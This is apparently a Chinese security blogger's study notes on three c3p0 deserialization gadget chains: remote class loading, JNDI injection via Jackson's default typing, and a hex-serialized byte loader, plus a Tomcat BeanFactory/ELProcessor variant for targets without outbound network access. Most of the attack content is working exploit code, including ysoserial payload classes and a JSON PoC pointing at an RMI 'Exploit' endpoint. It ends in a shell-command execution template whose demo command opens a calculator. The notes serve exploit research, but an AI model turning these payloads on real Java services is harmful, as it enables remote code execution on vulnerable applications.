# c3p0的三个gadget

## http base

适用于原生反序列化，加载远程静态代码和无参构造方法触发，利用就是yso的链子，搬过来看一下

```java
package ysoserial.payloads;

import java.io.PrintWriter;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;

import com.mchange.v2.c3p0.PoolBackedDataSource;
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;


/**
 *
 *
 * com.sun.jndi.rmi.registry.RegistryContext->lookup
 * com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized->getObject
 * com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase->readObject
 *
 * Arguments:
 * - base_url:classname
 *
 * Yields:
 * - Instantiation of remotely loaded class
 *
 * @author mbechler
 *
 */
@PayloadTest ( harness="ysoserial.test.payloads.RemoteClassLoadingTest" )
@Dependencies( { "com.mchange:c3p0:0.9.5.2" ,"com.mchange:mchange-commons-java:0.2.11"} )
@Authors({ Authors.MBECHLER })
public class C3P0 implements ObjectPayload<Object> {
    public Object getObject ( String command ) throws Exception {
        int sep = command.lastIndexOf(':');
        if ( sep < 0 ) {
            throw new IllegalArgumentException("Command format is: <base_url>:<classname>");
        }

        String url = command.substring(0, sep);
        String className = command.substring(sep + 1);

        PoolBackedDataSource b = Reflections.createWithoutConstructor(PoolBackedDataSource.class);
        Reflections.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource(className, url));
        return b;
    }
    private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {
        private String className;
        private String url;
        public PoolSource ( String className, String url ) {
            this.className = className;
            this.url = url;
        }
        public Reference getReference () throws NamingException {
            return new Reference("exploit", this.className, this.url);
        }
        public PrintWriter getLogWriter () throws SQLException {return null;}
        public void setLogWriter ( PrintWriter out ) throws SQLException {}
        public void setLoginTimeout ( int seconds ) throws SQLException {}
        public int getLoginTimeout () throws SQLException {return 0;}
        public Logger getParentLogger () throws SQLFeatureNotSupportedException {return null;}
        public PooledConnection getPooledConnection () throws SQLException {return null;}
        public PooledConnection getPooledConnection ( String user, String password ) throws SQLException {return null;}
    }
    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(C3P0.class, args);
    }
}
```

这里的poolSource

![image-20220511234535859](https://gitee.com/ddem0/typora-pic/raw/master/images/image-20220511234535859.png)

没有实现反序列化接口，所以在`writeObject`的时候

![image-20220511234626839](https://gitee.com/ddem0/typora-pic/raw/master/images/image-20220511234626839.png)

会进入图中的流程。

![image-20220511234828167](https://gitee.com/ddem0/typora-pic/raw/master/images/image-20220511234828167.png)

![image-20220511234838580](https://gitee.com/ddem0/typora-pic/raw/master/images/image-20220511234838580.png)

`Referenceable`继承了的。所以在最后，这属性就变成了`ReferenceIndirector`.然后在反序列化的时候。

![image-20220511235157612](https://gitee.com/ddem0/typora-pic/raw/master/images/image-20220511235157612.png)

调用他的getObject.

![image-20220511235234844](https://gitee.com/ddem0/typora-pic/raw/master/images/image-20220511235234844.png)

然后就会调用`URLClassLoader`.

![image-20220511235339139](https://gitee.com/ddem0/typora-pic/raw/master/images/image-20220511235339139.png)

## jndi 注入

PoolBackedDataSourceBase.掏出别人的exp学习一下。jndi适用于jdk8u191以下支持`reference`情况(这里的意思是只打C3P0，如果有其他依赖不是爽歪歪。)

```java
import com.fasterxml.jackson.databind.ObjectMapper;
import java.io.*;
class Person {
    public Object object;
}
public class TemplatePoc {
    public static void main(String[] args) throws IOException {
        String poc = "{\"object\":[\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\",{\"jndiName\":\"rmi://localhost:8088/Exploit\", \"loginTimeout\":0}]}";
        System.out.println(poc);
        ObjectMapper objectMapper = new ObjectMapper();
        objectMapper.enableDefaultTyping();
        objectMapper.readValue(poc, Person.class);
    }
    public static byte[] toByteArray(InputStream in) throws IOException {
        byte[] classBytes;
        classBytes = new byte[in.available()];
        in.read(classBytes);
        in.close();
        return classBytes;
    }
    public static String bytesToHexString(byte[] bArray, int length) {
        StringBuffer sb = new StringBuffer(length);

        for(int i = 0; i < length; ++i) {
            String sTemp = Integer.toHexString(255 & bArray[i]);
            if (sTemp.length() < 2) {
                sb.append(0);
            }
            sb.append(sTemp.toUpperCase());
        }
        return sb.toString();
    }
}
```

现在可以利用的地方我能想到的大概就在`Fastjson`,`SnakeYAML`等，可以触发set方法的地方。

![image-20220512001356297](https://gitee.com/ddem0/typora-pic/raw/master/images/image-20220512001356297.png)

![image-20220512002621832](https://gitee.com/ddem0/typora-pic/raw/master/images/image-20220512002621832.png)

![image-20220512002629931](https://gitee.com/ddem0/typora-pic/raw/master/images/image-20220512002629931.png)

![image-20220512002642145](https://gitee.com/ddem0/typora-pic/raw/master/images/image-20220512002642145.png)

## hex序列化字节加载器

c3p0不出网利用。

```java
import com.fasterxml.jackson.databind.ObjectMapper;
import java.io.*;

class Person {
    public Object object;
}

public class TemplatePoc {
    public static void main(String[] args) throws IOException {

        InputStream in = new FileInputStream("/Users/cengsiqi/Desktop/test.ser");
        byte[] data = toByteArray(in);
        in.close();
        String HexString = bytesToHexString(data, data.length);
        String poc = "{\"object\":[\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",{\"userOverridesAsString\":\"HexAsciiSerializedMap:"+ HexString + ";\"}]}";

        System.out.println(poc);
        ObjectMapper objectMapper = new ObjectMapper();
        objectMapper.enableDefaultTyping();
        objectMapper.readValue(poc, Person.class);
    }

    public static byte[] toByteArray(InputStream in) throws IOException {
        byte[] classBytes;
        classBytes = new byte[in.available()];
        in.read(classBytes);
        in.close();
        return classBytes;
    }

    public static String bytesToHexString(byte[] bArray, int length) {
        StringBuffer sb = new StringBuffer(length);

        for(int i = 0; i < length; ++i) {
            String sTemp = Integer.toHexString(255 & bArray[i]);
            if (sTemp.length() < 2) {
                sb.append(0);
            }

            sb.append(sTemp.toUpperCase());
        }
        return sb.toString();
    }

}
```

首先设置

![image-20220512004053837](https://gitee.com/ddem0/typora-pic/raw/master/images/image-20220512004053837.png)

然后

![image-20220512004239649](https://gitee.com/ddem0/typora-pic/raw/master/images/image-20220512004239649.png)

接下来就是dddd。

## 不出网利用

小trick:实例化BeanFactory对象调用`getObjectInstance`可以rce，`参考JNDI高版本在tomcat下的利用`。

[c3p0不出网利用](https://mp.weixin.qq.com/s?__biz=MzkzNTI4NjU1Mw==&mid=2247483871&idx=1&sn=56c63dc3f4dc22ad9c61143ee2c484df&chksm=c2b103a9f5c68abfb8e6cb39e81210cce98a3a6850c69b756b7018bc0db829d00af08839d8fc&mpshare=1&scene=23&srcid=1009lg8jEvc5MFXslLojyUud&sharer_sharetime=1644428964407&sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd)

```java
package ysoserial.payloads;


import java.io.PrintWriter;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.naming.StringRefAddr;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;

import com.mchange.v2.c3p0.PoolBackedDataSource;
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;

import org.apache.naming.ResourceRef;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;


/**
yulegeyu modified
 */
@PayloadTest ( harness="ysoserial.test.payloads.RemoteClassLoadingTest" )
@Dependencies( { "com.mchange:c3p0:0.9.5.2" ,"com.mchange:mchange-commons-java:0.2.11"} )
@Authors({ Authors.MBECHLER })
public class C3P0Tomcat implements ObjectPayload<Object> {
    public Object getObject ( String command ) throws Exception {

        PoolBackedDataSource b = Reflections.createWithoutConstructor(PoolBackedDataSource.class);
        Reflections.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource("org.apache.naming.factory.BeanFactory", null));
        return b;
    }

    private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {

        private String className;
        private String url;

        public PoolSource ( String className, String url ) {
            this.className = className;
            this.url = url;
        }

        public Reference getReference () throws NamingException {
            ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
            ref.add(new StringRefAddr("forceString", "x=eval"));
            String cmd = "open -a calculator.app";
            ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','"+ cmd +"']).start()\")"));
            return ref;
        }

        public PrintWriter getLogWriter () throws SQLException {return null;}
        public void setLogWriter ( PrintWriter out ) throws SQLException {}
        public void setLoginTimeout ( int seconds ) throws SQLException {}
        public int getLoginTimeout () throws SQLException {return 0;}
        public Logger getParentLogger () throws SQLFeatureNotSupportedException {return null;}
        public PooledConnection getPooledConnection () throws SQLException {return null;}
        public PooledConnection getPooledConnection ( String user, String password ) throws SQLException {return null;}

    }


    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(C3P0.class, args);
    }

}
```

这里是触发的地点。


![image-20220512200919472](https://gitee.com/ddem0/typora-pic/raw/master/images/image-20220512200919472.png)

整个序列化的链子大概就是

![image-20220512201208386](https://gitee.com/ddem0/typora-pic/raw/master/images/image-20220512201208386.png)

在writeobject的时候，这里调用poolsource的getReference方法，这样也就是设置好了这些的一切.后面的链子就和JNDI的一样了。